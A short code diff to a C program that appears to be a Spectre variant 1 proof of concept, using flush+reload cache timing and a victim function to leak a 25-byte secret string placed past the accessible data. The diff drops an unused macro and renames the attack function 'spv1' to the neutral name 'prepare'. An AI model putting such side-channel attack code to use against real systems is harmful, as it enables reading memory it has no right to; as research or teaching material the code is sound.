@@ -9,7 +9,6 @@
 #define REPETITIONS 100
 #define CACHE_HIT 100
 #define MAYBE_CACHE_HIT 175
-#define DATA_SIZE (accessible + secret_size)
 #define SECRET_SIZE 25
 #define DATA "notasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretzhis is a secret message"
 
@@ -41,7 +40,7 @@ void victim_func(int index, cp_t* arr, unsigned char* data) {
     }
 }
 
-int* spv1(int index) {
+int* prepare(int index) {
 
     cp_t* flush_reload_arr = init_flush_reload(N_PAGES);
     flush_arr((void*)flush_reload_arr, N_PAGES);
@@ -80,7 +79,7 @@ int main(int argc, char* argv[]) {
     for(int r = 0; r < REPETITIONS; r++) {
 
         for (int s = 0; s < SECRET_SIZE; s++) {
-            results[r][s] = spv1(accessible + s);
+            results[r][s] = prepare(accessible + s);
             cpuid();
         }
     }
